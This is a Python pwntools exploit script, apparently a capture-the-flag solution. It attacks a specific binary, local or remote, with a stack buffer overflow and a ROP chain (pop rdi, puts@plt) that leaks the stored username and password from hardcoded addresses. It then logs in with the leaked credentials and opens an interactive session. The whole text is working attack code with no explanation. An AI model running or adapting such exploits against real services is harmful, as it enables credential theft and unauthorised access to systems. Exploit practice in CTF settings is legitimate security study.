import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

###address###

puts_plt = 0x4006a0
username_addr = 0x6020c0
password_addr = 0x6020e0

pop_rdi = 0x400b03

def set_target():
    if len(sys.argv) == 2:
        program_name = sys.argv[1]
        return process(program_name)

    else:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        return remote(HOST, PORT)

###main###
def main():
    ###payload###
    target = set_target()

    payload = b"A" * 40
    payload += p64(pop_rdi)
    payload += p64(username_addr)
    payload += p64(puts_plt)[:-1]
    
    target.sendafter("Username: ", payload)
    _ = target.recvuntil("Password: ")
    target.shutdown("send")

    username = target.recvall()
    target.close()
    print(b"[*]user name is ... " + username)

    target = set_target()

    payload = b"A" * 40
    payload += p64(pop_rdi)
    payload += p64(password_addr)
    payload += p64(puts_plt)[:-1]
    
    target.sendafter("Username: ", payload)
    _ = target.recvuntil("Password: ")
    target.shutdown("send")

    password = target.recvline()
    target.close()
    print(b"[*]password is ... " + password)   

    target = set_target()

    target.sendlineafter("Username: ", username[:-2])
    target.sendlineafter("Password: ", password[:-1])

    target.interactive()

if __name__ == "__main__":
    main()
